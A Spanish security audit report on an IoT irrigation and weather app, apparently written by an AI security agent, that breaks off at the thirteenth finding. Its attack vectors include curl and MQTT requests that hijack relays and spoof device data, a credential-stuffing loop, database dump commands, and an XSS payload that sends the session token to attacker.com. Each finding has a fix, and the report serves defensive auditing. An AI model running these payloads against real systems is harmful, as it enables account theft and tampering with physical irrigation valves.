# Informe de Auditoría de Seguridad y Pentesting
## Aquantia / app_meteo — Versión 0.1.0-beta

**Fecha:** 2026-04-30
**Auditor:** Security Engineer Agent
**Rama analizada:** release/v0.1.0-beta
**Clasificación:** CONFIDENCIAL — Solo para uso interno

---

## 1. Resumen Ejecutivo

La aplicación Aquantia es un sistema IoT de monitorización meteorológica y control de riego que combina un backend Flask, broker MQTT Mosquitto, base de datos TimescaleDB (PostgreSQL), dispositivos ESP32 y un frontend React. El sistema gestiona sensores físicos, comandos de relay (electroválvulas), y datos de series temporales de usuarios.

### Severidad General: ALTA

Se identificaron **18 vulnerabilidades**: 3 Críticas, 6 Altas, 5 Medias, 3 Bajas y 1 Informativa. Las vulnerabilidades críticas son directamente explotables sin autenticación previa o con autenticación básica y permiten comprometer la integridad del sistema, manipular dispositivos IoT físicos, y acceder a datos de todos los usuarios.

### Hallazgos Críticos

| # | Vulnerabilidad | Severidad | Explotable sin auth |
|---|---------------|-----------|---------------------|
| VULN-001 | Credenciales hardcodeadas en `.env` y `docker-compose.yml` | Crítica | Si |
| VULN-002 | Endpoints ESP32 sin autenticación permiten inyección de datos y control de relays | Crítica | Si |
| VULN-003 | ACL MQTT completamente permisiva — cualquier dispositivo autenticado controla cualquier otro | Crítica | No (MQTT auth) |
| VULN-004 | CORS wildcard `CORS(app)` sin restricción de origen | Alta | Si |
| VULN-005 | JWT en `localStorage` — vulnerable a robo por XSS | Alta | No |
| VULN-006 | Sin rate limiting en login ni en registro | Alta | Si |

---

## 2. Hallazgos Detallados

---

### VULN-001 — Credenciales hardcodeadas en repositorio

**Severidad:** CRITICA
**CVSS 3.1:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
**CWE:** CWE-798 (Use of Hard-coded Credentials)

**Descripción técnica:**

Múltiples credenciales de producción están hardcodeadas en archivos del repositorio Git:

```
# backend/.env (COMMITEADO al repositorio)
PG_PASS=aquantia_159

# docker-compose.yml
POSTGRES_PASSWORD: aquantia_159
JWT_SECRET_KEY: ${JWT_SECRET_KEY:-cambia_esto_en_produccion}  # fallback inseguro
PG_PASS:        ${PG_PASS:-cambia_esto}                       # fallback inseguro
MQTT_PASSWORD:  ${MQTT_PASSWORD:-cambia_esto}                  # fallback inseguro
```

El archivo `backend/.env` contiene `PG_PASS=aquantia_159` y está presente en el repositorio (no en `.gitignore` o ignorado efectivamente). Cualquier persona con acceso al repositorio (GitHub, GitLab, colaborador, fork) obtiene acceso directo a la base de datos PostgreSQL.

El fallback `"cambia_esto_en_produccion"` en `JWT_SECRET_KEY` es especialmente peligroso: si el despliegue se hace sin configurar la variable de entorno, todos los JWT pueden ser forjados con ese secreto conocido.

**Vector de ataque:**

1. Acceso al repositorio Git (público o privado comprometido)
2. Extraer `backend/.env` → obtener `PG_PASS=aquantia_159`
3. Conectar directamente al puerto 5432 (expuesto al host): `psql -h <IP_SERVIDOR> -U aquantia -d aquantia`
4. Acceso completo a todos los datos: usuarios, hashes de contraseñas, telemetría, tokens de dispositivos
5. Con el JWT_SECRET_KEY conocido: forjar tokens JWT de cualquier usuario sin conocer su contraseña

**Impacto:**
- Extracción completa de la base de datos (usuarios, hashes bcrypt, telemetría IoT)
- Forja de tokens JWT para suplantar cualquier usuario, incluyendo administradores
- Modificación o eliminación de datos de producción
- Control total del sistema de riego mediante comandos relay autenticados

**Remediación:**

```bash
# 1. Añadir .env al .gitignore INMEDIATAMENTE
echo "backend/.env" >> .gitignore
echo ".env" >> backend/.gitignore

# 2. Rotar TODAS las credenciales comprometidas (la contraseña ya fue expuesta)
# En PostgreSQL:
ALTER USER aquantia WITH PASSWORD 'nueva_clave_aleatoria_128bits';

# 3. Generar JWT_SECRET_KEY seguro
python -c "import secrets; print(secrets.token_hex(32))"
```

```yaml
# docker-compose.yml — NUNCA usar fallbacks visibles
environment:
  JWT_SECRET_KEY: ${JWT_SECRET_KEY}      # sin fallback; falla si no está definida
  PG_PASS:        ${PG_PASS}             # sin fallback
  MQTT_PASSWORD:  ${MQTT_PASSWORD}       # sin fallback
```

```bash
# 4. Purgar el secreto del historial de Git
git filter-repo --path backend/.env --invert-paths
# O usar BFG Repo-Cleaner:
# bfg --delete-files .env
```

Usar un gestor de secretos (HashiCorp Vault, AWS Secrets Manager, Docker Secrets) para entornos de producción.

---

### VULN-002 — Endpoints ESP32 sin autenticación permiten falsificación de datos y control de relays

**Severidad:** CRITICA
**CVSS 3.1:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L)
**CWE:** CWE-306 (Missing Authentication for Critical Function)

**Descripción técnica:**

Los siguientes endpoints están explícitamente exentos de autenticación JWT en el `_JWT_PUBLIC` set y en el middleware `_require_jwt`:

```python
# app.py líneas 233-236
if request.path == "/api/device_info" and request.method == "POST":
    return  # SIN AUTENTICACIÓN
if request.path in ("/api/relay/command", "/api/relay/ack"):
    return  # SIN AUTENTICACIÓN — control físico de relays
```

El endpoint `POST /api/device_info` acepta cualquier payload JSON sin validar quién lo envía:

```python
# app.py línea 601-638 — sin autenticación, sin validación de esquema
@app.route("/api/device_info", methods=["POST"])
def post_device_info():
    payload = request.get_json(silent=True)
    # Inserta directamente en DB con valores del payload
    cursor.execute("""INSERT INTO device_info(...) VALUES (?,?,?,?,?,?,?,?,?,...)""",
        (payload.get("chip_model"), payload.get("mac_address"), ...))
```

El endpoint `GET /api/relay/command` devuelve el estado de relay de cualquier MAC sin verificar ownership:

```python
# app.py línea 711-720
@app.route("/api/relay/command")
def relay_command():
    mac = request.args.get('mac')  # cualquier atacante puede especificar cualquier MAC
    states = _relay_get(mac)
    bitmask = sum(...)
    return str(bitmask), 200  # revela estado de relays de cualquier dispositivo
```

El endpoint `POST /api/relay/ack` permite a cualquier actor reportar el estado de cualquier relay sin firma ni autenticación:

```python
# app.py línea 776-796
@app.route("/api/relay/ack", methods=["POST"])
def relay_ack():
    mac = request.headers.get('X-Device-MAC') or request.args.get('mac')
    # Cualquiera puede enviar un ACK falso para cualquier MAC
    _relay_set_actual(mac, s['index'], ...)
```

**Vector de ataque:**

```bash
# Escenario 1: Inyección de datos falsos en home_weather_station
curl -X POST http://servidor:7000/api/device_info \
  -H "Content-Type: application/json" \
  -d '{"mac_address": "AA:BB:CC:DD:EE:FF", "relay_count": 10, "ip_address": "1.2.3.4"}'

# Escenario 2: Leer estado de relay de cualquier dispositivo
curl "http://servidor:7000/api/relay/command?mac=AA:BB:CC:DD:EE:FF"

# Escenario 3: Falsificar ACK de relay para confundir el estado del sistema
curl -X POST http://servidor:7000/api/relay/ack \
  -H "X-Device-MAC: AA:BB:CC:DD:EE:FF" \
  -d "1"

# Escenario 4: Crear registro de device_info malicioso con MAC de otro usuario
curl -X POST http://servidor:7000/api/device_info \
  -H "Content-Type: application/json" \
  -d '{"mac_address": "VICTIM:MAC", "relay_count": 255}'
```

**Impacto:**
- Control físico de electroválvulas de riego de otros usuarios sin credenciales
- Inyección de lecturas de telemetría falsas para manipular alertas y estadísticas
- Corrupción del estado de relay en base de datos (discrepancia entre estado real y registrado)
- Enumeración de dispositivos del sistema por MAC address

**Remediación:**

```python
# Opción A: Autenticación por token de dispositivo en relay/command y relay/ack
# El ESP32 incluye su token en el header Authorization

@app.route("/api/relay/command")
def relay_command():
    # Validar token de dispositivo
    token = request.headers.get("X-Device-Token")
    mac = request.args.get("mac", "").upper()
    if not mac or not _verify_device_token(mac, token):
        return jsonify({"error": "Autenticación de dispositivo requerida"}), 401
    ...

def _verify_device_token(mac: str, token: str) -> bool:
    """Verifica el token del dispositivo contra el hash en device_credentials."""
    if not token:
        return False
    db = get_db()
    row = db.execute(
        "SELECT token_hash FROM device_credentials WHERE mac=%s", (mac,)
    ).fetchone()
    if not row:
        return False
    return bcrypt.checkpw(token.encode(), row["token_hash"].encode())

# Opción B: Para /api/device_info, verificar que la MAC está en device_credentials
@app.route("/api/device_info", methods=["POST"])
def post_device_info():
    payload = request.get_json(silent=True) or {}
    mac = (payload.get("mac_address") or "").upper()
    token = request.headers.get("X-Device-Token", "")
    if not mac or not _verify_device_token(mac, token):
        return jsonify({"error": "Dispositivo no autorizado"}), 401
    ...
```

---

### VULN-003 — ACL MQTT completamente permisiva

**Severidad:** CRITICA
**CVSS 3.1:** 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L)
**CWE:** CWE-285 (Improper Authorization)

**Descripción técnica:**

El endpoint de ACL MQTT devuelve siempre `200 OK` sin ninguna verificación de permisos:

```python
# app.py líneas 1384-1389
@app.route("/api/mqtt/acl", methods=["POST"])
def mqtt_acl():
    """Llamado por mosquitto-go-auth para validar permisos de topic.
    Por ahora permisivo para todos los usuarios autenticados.
    """
    return jsonify({"ok": True}), 200  # SIEMPRE APRUEBA TODO
```

Esto significa que cualquier dispositivo ESP32 autenticado con MQTT puede:
- Publicar en `aquantia/OTRA_FINCA/cmd` — enviar comandos relay a dispositivos de otros usuarios
- Suscribirse a `aquantia/+/telemetry` — leer telemetría de todos los dispositivos
- Publicar en `aquantia/OTRA_FINCA/register` — registrar/sobrescribir info de dispositivos ajenos
- Publicar en `aquantia/OTRA_FINCA/alerts` — inyectar alertas falsas en otros sistemas

**Vector de ataque:**

Un ESP32 comprometido (o un atacante que haya obtenido el token de un solo dispositivo) puede:

```python
# Desde ESP32 comprometido o cliente MQTT con credenciales robadas:
import paho.mqtt.client as mqtt

client = mqtt.Client()
client.username_pw_set("AA:BB:CC:DD:EE:FF", "token_del_dispositivo_comprometido")
client.connect("meteo.aquantialab.com", 8883)

# Enviar comando relay a OTRO dispositivo de OTRO usuario
client.publish("aquantia/FINCA_VICTIMA/cmd", '{"relay": 0, "state": true}')

# Suscribirse a telemetría de TODOS los dispositivos
client.subscribe("aquantia/+/telemetry")
```

**Impacto:**
- Un dispositivo comprometido puede controlar físicamente los relays de cualquier otra finca/cliente
- Exposición de telemetría de todos los usuarios a cualquier dispositivo autenticado
- Pivot lateral entre clientes del sistema (fallo de multitenancy)

**Remediación:**

```python
# app.py — Implementar ACL real basada en finca_id
@app.route("/api/mqtt/acl", methods=["POST"])
def mqtt_acl():
    data = request.get_json(silent=True, force=True) or {}
    username = data.get("username", "")  # MAC del dispositivo o "backend"
    topic = data.get("topic", "")
    acc = data.get("acc", 1)  # 1=subscribe, 2=publish, 3=subscribe+publish

    # Backend tiene acceso total
    if username == "backend":
        return jsonify({"ok": True}), 200

    # Para dispositivos: verificar que el topic corresponde a su finca_id
    row = get_db().execute(
        """SELECT di.finca_id FROM device_credentials dc
           JOIN device_info di ON di.mac_address = dc.mac
           WHERE dc.mac = %s""",
        (username,)
    ).fetchone()

    if not row or not row["finca_id"]:
        return jsonify({"error": "no finca"}), 401

    finca_id = row["finca_id"]
    allowed_prefix = f"aquantia/{finca_id}/"

    # Solo puede publicar/suscribirse a su propio finca_id
    # (excepto telemetry/register/alerts que publica, cmd que suscribe)
    if topic.startswith(allowed_prefix):
        subtopic = topic[len(allowed_prefix):]
        if acc == 2 and subtopic in ("telemetry", "register", "alerts"):
            return jsonify({"ok": True}), 200
        if acc == 1 and subtopic == "cmd":
            return jsonify({"ok": True}), 200

    return jsonify({"error": "forbidden"}), 401
```

---

### VULN-004 — CORS wildcard sin restricción de origen

**Severidad:** ALTA
**CVSS 3.1:** 7.4 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)
**CWE:** CWE-942 (Permissive Cross-domain Policy)

**Descripción técnica:**

```python
# app.py línea 37
CORS(app)  # Permite CUALQUIER origen — Access-Control-Allow-Origin: *
```

La configuración `CORS(app)` sin parámetros establece `Access-Control-Allow-Origin: *` para todas las rutas, incluyendo endpoints que modifican estado (POST /api/relay, POST /api/settings, etc.).

**Vector de ataque:**

Un atacante puede alojar una página web maliciosa que realice peticiones autenticadas al backend Aquantia cuando la víctima la visita:

```html
<!-- Página maliciosa en https://evil.com -->
<script>
// El navegador envía la request con el JWT del usuario desde localStorage
// Nota: con CORS wildcard + credenciales, este ataque requiere que se use
// fetch con credentials:'include' o que el token esté en el header
fetch('https://aquantia.ejemplo.com/api/relay', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer ' + localStorage.getItem('aq_token') // si hay XSS
  },
  body: JSON.stringify({ state: true, index: 0 })
})
</script>
```

El riesgo se amplifica si hay XSS (VULN-005): un script inyectado puede robar el token de `localStorage` y hacer peticiones a cualquier origen.

**Impacto:**
- CSRF asistido por CORS en endpoints que modifican estado (relay, settings, pipeline config)
- Exfiltración de datos de telemetría desde contextos cross-origin
- En combinación con XSS: robo de token y control total de la cuenta

**Remediación:**

```python
# app.py — Restringir CORS a orígenes conocidos
from flask_cors import CORS
import os

ALLOWED_ORIGINS = os.getenv(
    "CORS_ORIGINS",
    "https://aquantialab.com,https://meteo.aquantialab.com"
).split(",")

CORS(app,
    origins=ALLOWED_ORIGINS,
    supports_credentials=True,
    allow_headers=["Content-Type", "Authorization"],
    methods=["GET", "POST", "DELETE", "OPTIONS"],
)
```

---

### VULN-005 — Token JWT en localStorage vulnerable a XSS

**Severidad:** ALTA
**CVSS 3.1:** 7.5 (AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N)
**CWE:** CWE-922 (Insecure Storage of Sensitive Information)

**Descripción técnica:**

```javascript
// AuthContext.jsx líneas 6-8 y 19-20
const [token, setToken] = useState(() => localStorage.getItem('aq_token'))
const [user, setUser] = useState(() => {
    try { return JSON.parse(localStorage.getItem('aq_user')) } catch { return null }
})

// Al hacer login:
localStorage.setItem('aq_token', data.token)    // JWT de 30 días en localStorage
localStorage.setItem('aq_user', JSON.stringify(data.user))  // objeto user completo
```

`localStorage` es accesible por cualquier script JavaScript que se ejecute en el mismo origen. Un solo XSS en cualquier componente de la aplicación permite robar el JWT completo (válido 30 días) y el objeto de usuario.

La duración de 30 días (`JWT_ACCESS_TOKEN_EXPIRES = datetime.timedelta(days=30)` en `app.py`) hace que una sola exfiltración del token proporcione acceso prolongado sin necesidad de credenciales.

**Vector de ataque:**

```javascript
// Payload XSS que roba el token (si hubiera un vector de inyección):
fetch('https://attacker.com/steal?token=' + localStorage.getItem('aq_token') +
      '&user=' + localStorage.getItem('aq_user'))

// El atacante recibe el JWT y puede operar durante 30 días
// como el usuario afectado desde cualquier dispositivo
```

**Impacto:**
- Robo de sesión con validez de 30 días desde cualquier vector XSS
- El objeto `aq_user` expone: id, email, display_name, role del usuario
- Sin mecanismo de revocación de tokens (no hay blacklist ni refresh token)

**Remediación:**

```javascript
// Opción preferida: HttpOnly cookie (requiere cambio en backend)
// El token NO es accesible desde JavaScript

// backend/app.py — Devolver token en cookie HttpOnly
from flask import make_response

@app.route("/api/auth/login", methods=["POST"])
def auth_login():
    # ... validación ...
    token = create_access_token(identity=str(user["id"]))
    response = make_response(jsonify({
        "user": {"id": user["id"], "email": user["email"], ...}
    }))
    response.set_cookie(
        "aq_token",
        token,
        httponly=True,       # Inaccesible a JavaScript
        secure=True,         # Solo HTTPS
        samesite="Strict",   # Protege contra CSRF
        max_age=60 * 60 * 24 * 7,  # 7 días máximo, no 30
    )
    return response

// AuthContext.jsx — Eliminar toda referencia a localStorage para el token
// El navegador envía la cookie automáticamente en cada request
const authFetch = useCallback(async (url, opts = {}) => {
    return fetch(url, { ...opts, credentials: 'include' })  // envía cookie
}, [])
```

Si no se puede usar HttpOnly cookie en el corto plazo, reducir al menos la duración del token a 1-4 horas y añadir un refresh token con rotación.

---

### VULN-006 — Sin rate limiting en endpoints de autenticación

**Severidad:** ALTA
**CVSS 3.1:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)

**Descripción técnica:**

El archivo `requirements.txt` no incluye ninguna librería de rate limiting (`flask-limiter`, `slowapi`, etc.). El endpoint de login no tiene ningún control de intentos fallidos:

```python
# app.py líneas 162-189
@app.route("/api/auth/login", methods=["POST"])
def auth_login():
    # Sin rate limiting, sin cuenta de intentos, sin lockout temporal
    # bcrypt.checkpw es intencionalmente lento (buen diseño) pero no detiene
    # ataques de fuerza bruta a escala
    if not user or not bcrypt.checkpw(password.encode(), user["password_hash"].encode()):
        return jsonify({"error": "Credenciales incorrectas"}), 401
```

El endpoint de registro tampoco tiene rate limiting, permitiendo la creación masiva de cuentas.

**Vector de ataque:**

```bash
# Ataque de credential stuffing (lista de credenciales filtradas):
for credential in credentials_list:
    curl -s -X POST http://servidor:7000/api/auth/login \
      -H "Content-Type: application/json" \
      -d "{\"email\": \"$EMAIL\", \"password\": \"$PASS\"}" &

# Con el puerto 7000 expuesto al host, el ataque puede venir desde Internet
# No hay limitación de velocidad, IP ban, ni CAPTCHA
```

**Impacto:**
- Ataques de fuerza bruta y credential stuffing sin restricción
- Enumeración de emails registrados (respuesta diferente para email no existente vs contraseña incorrecta — aunque ambos devuelven 401, el tiempo de respuesta con bcrypt varía)
- Creación masiva de cuentas (spam/abuse)

**Remediación:**

```python
# requirements.txt — añadir:
# flask-limiter

# app.py
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=[],
    storage_uri="memory://",  # usar Redis en producción: "redis://redis:6379"
)

@app.route("/api/auth/login", methods=["POST"])
@limiter.limit("5 per minute;20 per hour")  # 5 intentos/min, 20/hora por IP
def auth_login():
    ...
    # Añadir delay constante independiente de si el usuario existe
    # para prevenir timing attacks de enumeración de emails
    if not user:
        bcrypt.checkpw(b"dummy", b"$2b$12$dummy_hash_to_prevent_timing")
        return jsonify({"error": "Credenciales incorrectas"}), 401
    ...

@app.route("/api/auth/register", methods=["POST"])
@limiter.limit("3 per hour")
def auth_register():
    ...
```

---

### VULN-007 — Puerto 5432 (PostgreSQL) expuesto directamente al host

**Severidad:** ALTA
**CVSS 3.1:** 8.1 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H)
**CWE:** CWE-668 (Exposure of Resource to Wrong Sphere)

**Descripción técnica:**

```yaml
# docker-compose.yml líneas 12-13
ports:
  - "5432:5432"  # exponer solo en desarrollo; quitar en producción
```

El propio comentario en el compose reconoce que esto solo debería usarse en desarrollo, pero está configurado así en la rama `release/v0.1.0-beta`. Con la contraseña `aquantia_159` comprometida en el repositorio, esto representa acceso directo a la base de datos de producción desde Internet.

**Vector de ataque:**

```bash
# Desde cualquier IP en Internet (si el firewall no restringe el puerto):
psql -h meteo.aquantialab.com -p 5432 -U aquantia -d aquantia
# Password: aquantia_159 (obtenida del repositorio)

# Extracción completa de datos:
\copy (SELECT * FROM users) TO '/tmp/users.csv' CSV HEADER;
\copy (SELECT * FROM device_credentials) TO '/tmp/creds.csv' CSV HEADER;
```

**Impacto:**
- Acceso directo a toda la base de datos sin pasar por la capa de aplicación
- Bypass completo de todas las controles de autorización del backend Flask
- Exfiltración de datos de usuarios y credenciales de dispositivos

**Remediación:**

```yaml
# docker-compose.yml — Eliminar el puerto expuesto para TimescaleDB
timescaledb:
  image: timescale/timescaledb:latest-pg16
  # ELIMINAR la sección ports completamente
  # La DB solo es accesible dentro de la red Docker interna
  networks:
    - internal

# Solo el backend necesita acceder a la DB:
backend:
  networks:
    - internal
    - external  # para exponer el puerto 7000

networks:
  internal:
    internal: true  # sin acceso a Internet
  external:
```

Adicionalmente, configurar `pg_hba.conf` para aceptar conexiones solo desde la red interna Docker.

---

### VULN-008 — Adminer expuesto sin autenticación adicional

**Severidad:** ALTA
**CVSS 3.1:** 7.6 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)
**CWE:** CWE-306 (Missing Authentication for Critical Function)

**Descripción técnica:**

```yaml
# docker-compose.yml líneas 63-67
adminer:
  image: adminer:latest
  restart: unless-stopped
  ports:
    - "8888:8080"  # interfaz web de DB sin autenticación adicional
```

Adminer es una interfaz web completa de gestión de base de datos. Con la contraseña `aquantia_159` disponible en el repositorio, cualquier persona puede:
1. Ir a `http://servidor:8888`
2. Introducir `servidor: timescaledb`, `usuario: aquantia`, `contraseña: aquantia_159`
3. Tener acceso visual y de edición completa a toda la base de datos

**Impacto:**
- Mismos que VULN-007 pero con interfaz gráfica (más accesible para atacantes no técnicos)
- Permite subida/descarga de archivos SQL
- Exposición permanente incluso si se rota la contraseña (el servicio sigue accesible)

**Remediación:**

```yaml
# Opción 1 (recomendada): Eliminar Adminer del compose de producción
# Usar solo en development con docker-compose.override.yml

# Opción 2: Restringir acceso a IP local y añadir autenticación HTTP básica via nginx
adminer:
  image: adminer:latest
  # Sin ports — solo acceso via reverse proxy con auth
  networks:
    - internal
```

```nginx
# nginx reverse proxy para Adminer (solo en emergencia, solo IPs de confianza)
location /adminer {
    auth_basic "Restringido";
    auth_basic_user_file /etc/nginx/.htpasswd;
    allow 192.168.1.0/24;  # solo red interna
    deny all;
    proxy_pass http://adminer:8080;
}
```

---

### VULN-009 — Sin validación de esquema en payloads MQTT

**Severidad:** ALTA
**CVSS 3.1:** 7.2 (AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:H/A:L)
**CWE:** CWE-20 (Improper Input Validation)

**Descripción técnica:**

En `mqtt_client.py`, los handlers de mensajes MQTT insertan directamente en la base de datos los valores recibidos del dispositivo sin ninguna validación de tipo, rango, o esquema:

```python
# mqtt_client.py líneas 51-162
def _handle_telemetry(finca_id: str, payload: dict):
    db.execute("""INSERT INTO home_weather_station(...) VALUES (...)""", (
        payload.get("temperature"),       # sin validar rango [-50, 100]
        payload.get("pressure"),          # sin validar rango [800, 1100]
        payload.get("humidity"),          # sin validar rango [0, 100]
        ...
        payload.get("relay_active", 0),   # usado como bitmask, no validado
        payload.get("firmware_version"),  # string sin longitud máxima
    ))
```

Y en `_handle_register`:

```python
# mqtt_client.py líneas 186-225
def _handle_register(finca_id: str, payload: dict):
    db.execute("""INSERT INTO device_info(...) VALUES (...)""", (
        finca_id,
        payload.get("chip_model"),        # string sin sanitizar
        payload.get("relay_count", 1),    # sin límite superior
        payload.get("firmware_version"),  # sin validar formato semver
        ...
    ))
```

Un dispositivo ESP32 comprometido (o un mensaje forjado al broker MQTT) puede insertar:
- Valores numéricos extremos que distorsionen estadísticas y alertas
- Strings extremadamente largos que provoquen errores o consumo excesivo de almacenamiento
- `relay_count` con valores arbitrarios (ej. 9999) que creen filas de relay_state masivas

**Vector de ataque:**

```python
# Dispositivo comprometido publica al topic de su finca:
import json, paho.mqtt.client as mqtt

client = mqtt.Client()
client.username_pw_set("AA:BB:CC:DD:EE:FF", "token_valido")
client.connect("broker", 8883)

# Inyectar temperatura extrema para disparar alertas falsas
client.publish("aquantia/mi_finca/telemetry", json.dumps({
    "mac_address": "AA:BB:CC:DD:EE:FF",
    "temperature": 9999.99,
    "relay_count": 9999,           # crea 9999 filas en relay_state
    "firmware_version": "A" * 10000  # string muy largo
}))
```

**Impacto:**
- Corrupción de estadísticas de riego y alertas de presión
- DoS por saturación de relay_state con miles de filas
- Posible truncado o error en columnas con límites de longitud no definidos

**Remediación:**

```python
# mqtt_client.py — Añadir validación de esquema con pydantic o manualmente

from pydantic import BaseModel, Field, field_validator
from typing import Optional

class TelemetryPayload(BaseModel):
    mac_address: Optional[str] = Field(None, max_length=17, pattern=r'^[0-9A-F:]{17}$')
    temperature: Optional[float] = Field(None, ge=-50, le=100)
    pressure: Optional[float] = Field(None, ge=800, le=1100)
    humidity: Optional[float] = Field(None, ge=0, le=100)
    relay_active: Optional[int] = Field(0, ge=0, le=255)
    relay_count: Optional[int] = Field(1, ge=0, le=8)   # máximo 8 relays
    firmware_version: Optional[str] = Field(None, max_length=32)
    rssi: Optional[int] = Field(None, ge=-120, le=0)
    ts: Optional[int] = Field(None, ge=1_000_000_000, le=9_999_999_999)

def _handle_telemetry(finca_id: str, payload: dict):
    try:
        validated = TelemetryPayload.model_validate(payload)
    except Exception as e:
        logger.warning("Payload MQTT inválido de finca=%s: %s", finca_id, e)
        return  # Descartar payload inválido
    
    db = get_db_connection()
    try:
        db.execute("INSERT INTO home_weather_station(...) VALUES (...)", (
            validated.temperature,
            validated.pressure,
            ...
        ))
```

---

### VULN-010 — Listener MQTT interno sin TLS expuesto al host

**Severidad:** MEDIA
**CVSS 3.1:** 6.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
**CWE:** CWE-319 (Cleartext Transmission of Sensitive Information)

**Descripción técnica:**

```yaml
# docker-compose.yml líneas 59-61
ports:
  - "1883:1883"     # interno (backend dentro de Docker) — EXPUESTO AL HOST
  - "8883:8883"     # externo TLS (dispositivos ESP32)
```

```
# mosquitto.conf líneas 6-7
listener 1883
protocol mqtt  # sin TLS, sin autenticación obligatoria en este listener
```

El puerto 1883 (MQTT sin TLS) está mapeado al host, lo que significa que es accesible desde el exterior. Aunque `mosquitto-go-auth` requiere credenciales, la comunicación es en texto claro, exponiendo:
- Credenciales MQTT en tránsito si hay un MITM en la red del servidor
- Todo el contenido de los mensajes (telemetría, comandos relay)

Si el firewall del servidor no bloquea el puerto 1883, cualquier atacante puede intentar conectarse con credenciales robadas o en texto claro.

**Remediación:**

```yaml
# docker-compose.yml — No exponer el puerto 1883 al host
mosquitto:
  ports:
    # - "1883:1883"  # ELIMINAR — solo interno
    - "8883:8883"   # solo TLS para ESP32 externos
  networks:
    - internal      # solo accesible por el backend dentro de Docker
```

```
# mosquitto.conf — Añadir bind_address al listener interno
listener 1883 127.0.0.1   # o la IP de la red Docker interna
# O mejor: usar socket Unix en lugar de TCP para comunicación interna
```

---

### VULN-011 — Ausencia total de cabeceras de seguridad HTTP

**Severidad:** MEDIA
**CVSS 3.1:** 5.4 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)
**CWE:** CWE-693 (Protection Mechanism Failure)

**Descripción técnica:**

No existe ningún `@app.after_request` ni middleware que añada cabeceras de seguridad HTTP. La búsqueda en todo el código backend no devuelve ninguna referencia a:
- `Content-Security-Policy`
- `X-Frame-Options`
- `X-Content-Type-Options`
- `Strict-Transport-Security`
- `Referrer-Policy`
- `Permissions-Policy`

**Impacto:**
- Sin CSP: cualquier XSS que se descubra tiene máximo impacto (acceso a localStorage con el JWT)
- Sin X-Frame-Options: la aplicación puede ser embebida en iframes para ataques de clickjacking
- Sin X-Content-Type-Options: MIME sniffing en navegadores antiguos
- Sin HSTS: downgrade a HTTP posible en primer acceso

**Remediación:**

```python
# app.py — Añadir después de crear la instancia Flask

@app.after_request
def add_security_headers(response):
    # Protección XSS y inyección de contenido
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "  # ajustar si se usan CSS externos
        "img-src 'self' data:; "
        "connect-src 'self'; "
        "frame-ancestors 'none';"
    )
    # Clickjacking
    response.headers['X-Frame-Options'] = 'DENY'
    # MIME sniffing
    response.headers['X-Content-Type-Options'] = 'nosniff'
    # Referrer
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    # HTTPS enforcement (solo cuando hay TLS)
    response.headers['Strict-Transport-Security'] = (
        'max-age=31536000; includeSubDomains'
    )
    # Eliminar información del servidor
    response.headers.pop('Server', None)
    return response
```

---

### VULN-012 — Endpoint /api/settings sin control de autorización por rol

**Severidad:** MEDIA
**CVSS 3.1:** 6.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L)
**CWE:** CWE-862 (Missing Authorization)

**Descripción técnica:**

```python
# app.py líneas 271-285
@app.route("/api/settings", methods=["POST"])
def api_set_settings():
    """Actualiza uno o varios parámetros de configuración."""
    payload = request.get_json(silent=True)
    if not payload:
        return jsonify({"error": "JSON requerido"}), 400
    db = get_db()
    for key, value in payload.items():   # CUALQUIER key arbitraria
        db.execute(
            "INSERT OR REPLACE INTO app_settings(key, value) VALUES (?, ?)",
            (key, str(value))
        )
    db.commit()
```

Cualquier usuario autenticado (rol `user`) puede:
1. Modificar cualquier setting del sistema (`flow_lpm`, `baseline_daily_l`, `pipeline_scenario`, `min_firmware_version`, `station_name`, etc.)
2. Insertar claves arbitrarias en `app_settings` sin ningún whitelist de keys permitidas
3. No hay verificación de rol `admin` — todos los usuarios tienen el mismo nivel de acceso a la configuración del sistema

Esto también aplica a `POST /api/pipeline/config`, que permite a cualquier usuario cambiar el escenario de pipeline para todos.

**Vector de ataque:**

```bash
# Usuario normal modificando configuración del sistema
curl -X POST http://servidor:7000/api/settings \
  -H "Authorization: Bearer TOKEN_USUARIO_NORMAL" \
  -H "Content-Type: application/json" \
  -d '{"min_firmware_version": "999.0.0", "pipeline_scenario": "burst"}'
# Resultado: todos los dispositivos reportarán firmware desactualizado
# y el pipeline cambia a modo "burst" para todos los usuarios
```

**Remediación:**

```python
# app.py — Añadir control de rol para settings del sistema

ADMIN_ONLY_SETTINGS = {
    'min_firmware_version', 'pipeline_scenario', 'pipeline_mode'
}
ALLOWED_SETTINGS = {
    'flow_lpm', 'baseline_daily_l', 'station_name', 'station_location',
    'telemetry_interval_s', 'config_sync_interval_s', 'display_timeout_s',
    'pipeline_scenario', 'pipeline_mode', 'min_firmware_version',
}

@app.route("/api/settings", methods=["POST"])
def api_set_settings():
    user_id = int(get_jwt_identity())
    user_role = _get_user_role(user_id)
    payload = request.get_json(silent=True) or {}

    for key in payload:
        if key not in ALLOWED_SETTINGS:
            return jsonify({"error": f"Setting no permitido: {key}"}), 400
        if key in ADMIN_ONLY_SETTINGS and user_role != "admin":
            return jsonify({"error": "Requiere rol administrador"}), 403
    ...
```

---

### VULN-013 — Endpoint /api/alerts sin filtrado por ownership del usuario

**Severidad:** MEDIA
**CVSS 3.1:** 5.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
